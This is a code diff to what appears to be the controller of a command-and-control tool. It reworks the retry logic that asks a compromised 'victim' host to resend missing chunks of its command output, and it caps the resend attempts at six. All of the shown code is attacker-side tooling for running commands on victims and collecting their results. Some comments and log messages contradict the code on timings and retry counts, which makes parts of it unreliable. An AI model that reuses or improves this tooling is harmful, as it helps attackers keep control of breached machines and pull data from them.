@@ -95,30 +95,40 @@ def send_msg(message, is_cached: bool):
         COMMAND_READY.set()
 
 def timeout_checker():
+    """Detect incomplete responses and request retransmission of missing packets"""
     global received_chunks, expected_chunks, last_received_time, resends_requests
     while True:
         try:
             if last_received_time is not None:
-                try:
-                    current_session_id = None
-                    current_buffer = None
-                    if received_chunks:
-                        current_session_id = next(iter(received_chunks))
-                        current_buffer = received_chunks[current_session_id]["chunks"]
-                        expected_chunks = received_chunks[current_session_id]["total"]
-                    if expected_chunks and current_buffer and (len(current_buffer) > 0) and ((time.time() - last_received_time) > 3):
-                        missing_packets = check_missing_packets(current_buffer, expected_chunks)
-                        if missing_packets:
-                            log_info(f"<ansiyellow>Received an incomplete response from the vicim, asking victim for {len(missing_packets)} missing packets</ansiyellow>")
-                            indices_str = ",".join(str(i) for i in missing_packets)
-                            time.sleep(100)
-                            msg = f"RESEND:{indices_str}"
-                            send_msg(msg, False)
-                            resends_requests += 1
-                            # time.sleep(5)
-                            continue
-                except Exception as e:
-                    log_error(f"Timeout checker error: {str(e)}")
+                if resends_requests < 6:  # Only retry 6 times
+                    try:
+                        current_session_id = None
+                        current_buffer = None
+                        if received_chunks:
+                            current_session_id = next(iter(received_chunks))
+                            current_buffer = received_chunks[current_session_id]["chunks"]
+                            expected_chunks = received_chunks[current_session_id]["total"]
+                        # If 3+ seconds passed and we're still missing chunks, request resend
+                        if expected_chunks and current_buffer and (len(current_buffer) > 0) and ((time.time() - last_received_time) > 1.5):
+                            missing_packets = check_missing_packets(current_buffer, expected_chunks)
+                            if missing_packets:
+                                log_info(f"<ansiyellow>Received an incomplete response from the vicim, asking victim for {len(missing_packets)} missing packets</ansiyellow>")
+                                indices_str = ",".join(str(i) for i in missing_packets)
+                                msg = f"RESEND:{indices_str}"
+                                send_msg(msg, False)
+                                resends_requests += 1
+                                time.sleep(1)
+                                continue
+                    except Exception as e:
+                        log_error(f"Timeout checker error: {str(e)}")
+                else:
+                    # Give up after 6 retries
+                    log_error("<ansired>Received an incomplete response from the vicim, tried 3 times to request the missing packets but didn't receive them, IGNORING THE RESPONSE!</ansired>")
+                    resends_requests = 0
+                    last_received_time = None
+                    received_chunks = {}
+                    expected_chunks = None
+                    COMMAND_READY.set()
             time.sleep(0.5)
         except Exception:
             pass
@@ -418,4 +428,5 @@ try:
 except KeyboardInterrupt:
     log_info("<ansiyellow>Exiting on user interrupt (Ctrl+C)</ansiyellow>")
     exit()
+
 
